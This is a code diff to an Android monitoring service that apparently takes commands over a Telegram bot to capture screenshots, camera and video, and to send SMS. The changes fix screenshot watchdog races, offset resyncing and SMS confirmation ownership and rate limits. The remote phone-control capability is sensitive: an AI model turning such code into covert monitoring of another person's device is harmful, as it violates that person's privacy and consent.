@@ -88,6 +88,7 @@ class MonitoringService : Service() {
     private var videoWatchdog: Job? = null
     private val shotBusy = AtomicBoolean(false)
     private var shotWatchdog: Job? = null
+    private val shotAttempt = java.util.concurrent.atomic.AtomicInteger(0)
     @Volatile
     private var appliedFgsTypes = 0
 
@@ -811,7 +812,11 @@ class MonitoringService : Service() {
             try {
                 val body = response.errorBody()?.string()?.lowercase(java.util.Locale.ROOT).orEmpty()
                 if (body.contains("offset")) {
-                    android.util.Log.w("MonitoringService", "getUpdates offset rejected, keeping offset ${preferencesManager.lastUpdateId}")
+                    android.util.Log.w("MonitoringService", "getUpdates offset rejected, resyncing from zero")
+                    try {
+                        preferencesManager.setLastUpdateIdSync(0L)
+                    } catch (_: Exception) {
+                    }
                     commandBackoffUntil = android.os.SystemClock.elapsedRealtime() + 30_000L
                 }
             } catch (_: Exception) {
@@ -1537,8 +1542,11 @@ class MonitoringService : Service() {
                 } else {
                     val stagedNumber = try { preferencesManager.pendingSmsNumber } catch (_: Exception) { "" }
                     val stagedAt = try { preferencesManager.pendingSmsAt } catch (_: Exception) { 0L }
-                    if (stagedNumber.isNotEmpty() && stagedAt > 0L && System.currentTimeMillis() - stagedAt <= 300_000L) {
-                        sendToTelegram("\u26A0\uFE0F SMS pending exists to <code>$stagedNumber</code>. Reply /smsconfirm to confirm it first, or wait for it to expire.")
+                    val stagedBy = try { preferencesManager.pendingSmsOwner } catch (_: Exception) { "" }
+                    if (System.currentTimeMillis() - preferencesManager.lastSmsSendAt < 60_000L) {
+                        sendToTelegram("\u26A0\uFE0F Please wait a moment before sending another SMS.")
+                    } else if (stagedNumber.isNotEmpty() && stagedAt > 0L && System.currentTimeMillis() - stagedAt <= 300_000L && stagedBy.isNotEmpty() && stagedBy != senderId) {
+                        sendToTelegram("⛔ Only the requester can replace this pending SMS. Reply /smsconfirm to confirm it first, or wait for it to expire.")
                     } else {
                         preferencesManager.writeSmsPendingSync(normalized, smsText, System.currentTimeMillis(), senderId)
                         sendToTelegram("\uD83D\uDCE9 SMS to <code>$normalized</code> ready to send. Reply /smsconfirm to confirm (valid for 5 minutes).")
@@ -2672,6 +2680,7 @@ class MonitoringService : Service() {
         shotWatchdog?.cancel()
         cameraAttempt.incrementAndGet()
         videoAttempt.incrementAndGet()
+        shotAttempt.incrementAndGet()
         shotBusy.set(false)
         cameraBusy.set(false)
         smsBusy.set(false)
@@ -2964,10 +2973,11 @@ class MonitoringService : Service() {
             }
             return
         }
+        val shotSeq = shotAttempt.incrementAndGet()
         shotWatchdog?.cancel()
         val wd = serviceScope.launch {
             delay(45_000)
-            if (shotBusy.compareAndSet(true, false)) {
+            if (shotAttempt.get() == shotSeq && shotBusy.compareAndSet(true, false)) {
                 android.util.Log.w("MonitoringService", "Screenshot watchdog: capture did not finish, flag reset")
                 if (reportResult) {
                     sendToTelegram("⚠️ Screenshot timed out without a response. Please try /screenshot again.")
@@ -2989,6 +2999,11 @@ class MonitoringService : Service() {
                     } else {
                         notifyPhotoSendFailure("screen capture revoked")
                     }
+                    return@launch
+                }
+                if (shotAttempt.get() != shotSeq) {
+                    try { shotFile?.delete() } catch (_: Exception) { }
+                    shotBusy.set(false)
                     return@launch
                 }
                 try { wd.cancel() } catch (_: Exception) { }
